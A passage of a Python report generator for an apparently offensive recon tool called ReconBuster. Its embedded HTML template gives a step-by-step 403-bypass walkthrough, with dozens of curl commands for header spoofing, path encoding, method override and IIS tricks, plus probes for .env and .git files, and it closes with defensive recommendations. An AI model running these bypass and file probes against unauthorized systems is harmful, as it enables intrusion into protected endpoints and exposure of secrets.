                        <div class="method-title">Vulnerability Assessment</div>
                        <div class="method-desc">Security headers analysis, sensitive file detection, and common vulnerability identification.</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Manual Testing Walkthrough -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">07</div>
                <div class="section-title">MANUAL TESTING WALKTHROUGH</div>
            </div>
            <div class="section-body">
                <div class="vuln-field">
                    <div class="vuln-field-label">RECOMMENDED TOOLS</div>
                    <div class="vuln-field-value">
                        <table class="data-table" style="margin-bottom: 20px;">
                            <thead>
                                <tr>
                                    <th>Tool</th>
                                    <th>Purpose</th>
                                    <th>Installation</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><strong>Burp Suite</strong></td>
                                    <td>HTTP proxy, request modification, repeater for bypass testing</td>
                                    <td><code>Download from portswigger.net</code></td>
                                </tr>
                                <tr>
                                    <td><strong>cURL</strong></td>
                                    <td>Command-line HTTP requests with custom headers</td>
                                    <td><code>apt install curl</code></td>
                                </tr>
                                <tr>
                                    <td><strong>ffuf</strong></td>
                                    <td>Fast web fuzzer for directory/parameter discovery</td>
                                    <td><code>go install github.com/ffuf/ffuf/v2@latest</code></td>
                                </tr>
                                <tr>
                                    <td><strong>httpx</strong></td>
                                    <td>HTTP probing and response analysis</td>
                                    <td><code>go install github.com/projectdiscovery/httpx/cmd/httpx@latest</code></td>
                                </tr>
                                <tr>
                                    <td><strong>nuclei</strong></td>
                                    <td>Template-based vulnerability scanner</td>
                                    <td><code>go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</code></td>
                                </tr>
                                <tr>
                                    <td><strong>bypass-403</strong></td>
                                    <td>Dedicated 403 bypass tool</td>
                                    <td><code>git clone https://github.com/iamj0ker/bypass-403</code></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">STEP 1: INITIAL RECONNAISSANCE</div>
                    <div class="vuln-field-value">
                        <p style="margin-bottom: 15px;">Before testing bypasses, gather information about the target:</p>
                        <div class="vuln-evidence" style="margin-bottom: 10px;"># Check robots.txt for hidden paths
curl -s https://TARGET/robots.txt

# Fetch and analyze sitemap
curl -s https://TARGET/sitemap.xml

# Check for common sensitive files
curl -s -o /dev/null -w "%{{http_code}}" https://TARGET/.git/config
curl -s -o /dev/null -w "%{{http_code}}" https://TARGET/.env
curl -s -o /dev/null -w "%{{http_code}}" https://TARGET/backup.zip

# Enumerate directories with ffuf
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302,403</div>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">STEP 2: IDENTIFY 403 FORBIDDEN ENDPOINTS</div>
                    <div class="vuln-field-value">
                        <p style="margin-bottom: 15px;">Find paths that return 403 Forbidden status:</p>
                        <div class="vuln-evidence" style="margin-bottom: 10px;"># Fuzz and filter for 403 responses
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o 403_paths.json

# Using httpx to probe multiple paths
cat paths.txt | httpx -status-code -mc 403 -o 403_endpoints.txt

# Common admin paths to check
curl -s -o /dev/null -w "%{{http_code}}" https://TARGET/admin
curl -s -o /dev/null -w "%{{http_code}}" https://TARGET/administrator
curl -s -o /dev/null -w "%{{http_code}}" https://TARGET/api/admin
curl -s -o /dev/null -w "%{{http_code}}" https://TARGET/dashboard</div>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">STEP 3: HEADER-BASED BYPASS TECHNIQUES</div>
                    <div class="vuln-field-value">
                        <p style="margin-bottom: 15px;">Try manipulating headers to bypass access controls:</p>
                        <div class="vuln-evidence" style="margin-bottom: 10px;"># IP Spoofing Headers
curl -H "X-Forwarded-For: 127.0.0.1" https://TARGET/admin
curl -H "X-Real-IP: 127.0.0.1" https://TARGET/admin
curl -H "X-Originating-IP: 127.0.0.1" https://TARGET/admin
curl -H "X-Remote-IP: 127.0.0.1" https://TARGET/admin
curl -H "X-Client-IP: 127.0.0.1" https://TARGET/admin
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://TARGET/admin
curl -H "True-Client-IP: 127.0.0.1" https://TARGET/admin

# URL Rewrite Headers
curl -H "X-Original-URL: /admin" https://TARGET/
curl -H "X-Rewrite-URL: /admin" https://TARGET/
curl -H "X-Forwarded-Host: localhost" https://TARGET/admin

# Combined Headers
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: localhost" -H "X-Original-URL: /admin" https://TARGET/</div>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">STEP 4: PATH MANIPULATION TECHNIQUES</div>
                    <div class="vuln-field-value">
                        <p style="margin-bottom: 15px;">Manipulate the URL path to bypass access controls:</p>
                        <div class="vuln-evidence" style="margin-bottom: 10px;"># Basic Path Tricks
curl https://TARGET/admin/
curl https://TARGET/admin//
curl https://TARGET//admin//
curl https://TARGET/./admin
curl https://TARGET/admin/.
curl https://TARGET/admin..;/

# URL Encoding Variations
curl "https://TARGET/%2e/admin"          # Single encode .
curl "https://TARGET/%252e/admin"        # Double encode .
curl "https://TARGET/admin%2f"           # Encode /
curl "https://TARGET/admin%00"           # Null byte
curl "https://TARGET/admin%20"           # Space
curl "https://TARGET/admin%09"           # Tab

# Semicolon Tricks (Java/Spring)
curl "https://TARGET/admin;/"
curl "https://TARGET/admin;.css"
curl "https://TARGET/;/admin"
curl "https://TARGET/.;/admin"

# Extension Tricks
curl https://TARGET/admin.json
curl https://TARGET/admin.html
curl https://TARGET/admin.php
curl https://TARGET/admin?anything

# Case Manipulation (Windows Servers)
curl https://TARGET/ADMIN
curl https://TARGET/Admin
curl https://TARGET/aDmIn</div>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">STEP 5: HTTP METHOD MANIPULATION</div>
                    <div class="vuln-field-value">
                        <p style="margin-bottom: 15px;">Try different HTTP methods to bypass restrictions:</p>
                        <div class="vuln-evidence" style="margin-bottom: 10px;"># Different HTTP Methods
curl -X GET https://TARGET/admin
curl -X POST https://TARGET/admin
curl -X PUT https://TARGET/admin
curl -X PATCH https://TARGET/admin
curl -X DELETE https://TARGET/admin
curl -X OPTIONS https://TARGET/admin
curl -X HEAD https://TARGET/admin
curl -X TRACE https://TARGET/admin

# WebDAV Methods
curl -X PROPFIND https://TARGET/admin
curl -X MKCOL https://TARGET/admin
curl -X COPY https://TARGET/admin
curl -X MOVE https://TARGET/admin

# Method Override Headers
curl -X POST -H "X-HTTP-Method-Override: GET" https://TARGET/admin
curl -X POST -H "X-Method-Override: PUT" https://TARGET/admin

# Protocol Downgrade
curl --http1.0 https://TARGET/admin</div>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">STEP 6: ADVANCED BYPASS TECHNIQUES</div>
                    <div class="vuln-field-value">
                        <p style="margin-bottom: 15px;">Advanced techniques for stubborn 403 errors:</p>
                        <div class="vuln-evidence" style="margin-bottom: 10px;"># IIS Cookieless Session Bypass
curl "https://TARGET/(S(x))/admin"
curl "https://TARGET/(A(x))/admin"
curl "https://TARGET/(F(x))/admin"

# Unicode Normalization
curl "https://TARGET/%c0%af/admin"       # Overlong encoding
curl "https://TARGET/%ef%bc%8f/admin"    # Fullwidth solidus

# Trim Inconsistency (Flask/Node/Spring)
curl "https://TARGET/admin%85"           # Flask
curl "https://TARGET/admin%0a"           # Node.js
curl "https://TARGET/admin;"             # Spring Boot

# Fragment/Hash Bypass
curl "https://TARGET/admin#"
curl "https://TARGET/admin%23"

# Double URL Encoding
curl "https://TARGET/%252e%252e/admin"
curl "https://TARGET/admin%252f"

# Burp Suite Intruder
# 1. Send 403 request to Intruder
# 2. Set payload position on path
# 3. Use bypass wordlist from PayloadsAllTheThings
# 4. Filter results by response code != 403</div>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">STEP 7: VERIFY AND DOCUMENT</div>
                    <div class="vuln-field-value">
                        <p style="margin-bottom: 15px;">After finding a bypass, verify it's genuine and document:</p>
                        <div class="vuln-evidence" style="margin-bottom: 10px;"># Verify bypass returns actual content (not error page)
curl -i "https://TARGET/bypass_url" | head -50

# Check response differs from original 403
curl -s https://TARGET/admin | wc -c         # Original size
curl -s "https://TARGET/bypass" | wc -c      # Bypass size

# Save evidence
curl -i "https://TARGET/bypass" > evidence.txt

# Screenshot with browser
# 1. Open DevTools Network tab
# 2. Navigate to bypass URL
# 3. Screenshot the response

# Document in report:
# - Original URL and status code
# - Bypass technique used
# - Bypass URL that worked
# - Response content length difference
# - Any sensitive data exposed
# - Manual reproduction steps with cURL</div>
                    </div>
                </div>

                <div class="vuln-field">
                    <div class="vuln-field-label">USEFUL RESOURCES</div>
                    <div class="vuln-field-value">
                        <ul style="padding-left: 20px; line-height: 2.2;">
                            <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/403%20Bypass" style="color: var(--primary);">PayloadsAllTheThings - 403 Bypass</a> - Comprehensive bypass payloads</li>
                            <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses" style="color: var(--primary);">HackTricks - 403 &amp; 401 Bypasses</a> - Detailed bypass techniques</li>
                            <li><a href="https://github.com/iamj0ker/bypass-403" style="color: var(--primary);">bypass-403</a> - Automated bypass testing tool</li>
                            <li><a href="https://portswigger.net/web-security/access-control" style="color: var(--primary);">PortSwigger - Access Control</a> - Access control vulnerability labs</li>
                            <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema" style="color: var(--primary);">OWASP Testing Guide</a> - Authorization testing methodology</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- Recommendations -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">08</div>
                <div class="section-title">RECOMMENDATIONS</div>
            </div>
            <div class="section-body">
                <div class="vuln-field">
                    <div class="vuln-field-label">CRITICAL ACTIONS</div>
                    <div class="vuln-field-value">
                        <ul style="padding-left: 20px; line-height: 2;">
                            <li>Immediately fix all 403 bypass vulnerabilities by implementing proper access controls at the application layer, not just the reverse proxy.</li>
                            <li>Remove or restrict access to all sensitive files discovered (.env, .git, backups, configs).</li>
                            <li>Review and rotate any exposed API keys, passwords, or tokens.</li>
                        </ul>
                    </div>
                </div>
                <div class="vuln-field">
                    <div class="vuln-field-label">HIGH PRIORITY</div>
                    <div class="vuln-field-value">
                        <ul style="padding-left: 20px; line-height: 2;">
                            <li>Implement security headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security.</li>
                            <li>Disable directory listing on all web servers.</li>
                            <li>Review authorization logic for all protected endpoints.</li>
                        </ul>
                    </div>
                </div>
                <div class="vuln-field">
                    <div class="vuln-field-label">ONGOING</div>
                    <div class="vuln-field-value">
                        <ul style="padding-left: 20px; line-height: 2;">
                            <li>Conduct regular security assessments and penetration testing.</li>
                            <li>Implement a Web Application Firewall (WAF) with bypass protection rules.</li>
                            <li>Monitor for unauthorized access attempts and anomalous patterns.</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="report-footer">
            <div class="footer-logo">RECONBUSTER</div>
            <div class="footer-text">Advanced Security Reconnaissance &amp; 403 Bypass Tool</div>
            <div class="footer-text" style="margin-top: 10px;">''' + f'''Report Generated: {date}</div>
        </div>
    </div>
</body>
</html>
'''

        return html_content

    def save_html(self, filename: str = None) -> str:
        """Save HTML report"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            target_clean = self.scan_data['target'].replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')
            filename = f"ReconBuster_Report_{target_clean}_{timestamp}.html"

        filepath = os.path.join(self.output_dir, filename)
        html_content = self.generate_html()

        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)

        return filepath

    def save_json(self, filename: str = None) -> str:
        """Save JSON data"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            target_clean = self.scan_data['target'].replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')
            filename = f"ReconBuster_Data_{target_clean}_{timestamp}.json"

        filepath = os.path.join(self.output_dir, filename)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(self.scan_data, f, indent=2, default=str)

        return filepath

    def generate_report(self) -> Dict[str, str]:
        """Generate both reports"""
        html_path = self.save_html()
        json_path = self.save_json()

        return {
            "html": html_path,
            "json": json_path
        }
